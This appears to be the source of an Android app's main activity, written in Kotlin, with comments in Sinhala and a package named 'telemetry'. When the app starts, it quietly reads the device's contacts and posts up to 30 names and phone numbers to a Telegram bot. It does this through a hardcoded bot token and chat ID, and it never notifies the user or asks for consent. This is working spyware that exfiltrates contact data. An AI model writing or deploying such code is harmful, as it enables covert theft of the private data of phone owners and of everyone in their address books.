
        package com.example.telemetry

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.example.telemetry.repository.ContactRepository
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    // ඔබගේ සැබෑ Bot Token සහ Chat ID මෙහි ඇතුළත් කර ඇත[span_2](start_span)[span_2](end_span)[span_3](start_span)[span_3](end_span)
    private val BOT_TOKEN = "9259742685:AAGMARnF3JH4BQMaj81SwnJkjUkOP8aGko"
    private val CHAT_ID = "8626384298"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // දුරකථන සම්බන්ධතා ලබාගෙන ටෙලිග්‍රෑම් වෙත යැවීම
        fetchContactsAndSendToTelegram()
    }

    private fun fetchContactsAndSendToTelegram() {
        val contactRepository = ContactRepository(this)
        val contacts = contactRepository.getAllContacts()

        // ටෙලිග්‍රෑම් වෙත යැවිය යුතු මැසේජ් එක සැකසීම
        val messageBuilder = StringBuilder("📱 *TelemetryApp - New Report*\n\n")
        messageBuilder.append("Total Contacts Found: *${contacts.size}*\n\n")

        // සම්බන්ධතා ලැයිස්තුවෙන් මුල් නම සහ දුරකථන අංක එකතු කිරීම
        for (i in 0 until minOf(contacts.size, 30)) { // උපරිම 30ක් එකවර යැවීමට
            messageBuilder.append("👤 ${contacts[i].name}\n📞 ${contacts[i].phoneNumber}\n---\n")
        }

        val messageText = messageBuilder.toString()

        // ඇන්ඩ්‍රොයිඩ් නීති අනුව නෙට්වර්ක් වැඩ Background Thread එකක කළ යුතුය
        Thread {
            try {
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val jsonParam = JSONObject()
                jsonParam.put("chat_id", CHAT_ID)
                jsonParam.put("text", messageText)
                jsonParam.put("parse_mode", "Markdown")

                val os = OutputStreamWriter(conn.outputStream)
                os.write(jsonParam.toString())
                os.flush()
                os.close()

                val responseCode = conn.responseCode
                Log.d("TelegramResponse", "Response Code: $responseCode")

            } catch (e: Exception) {
                e.printStackTrace()
                Log.e("TelegramError", "Error sending message: ${e.message}")
            }
        }.start()
    }
}
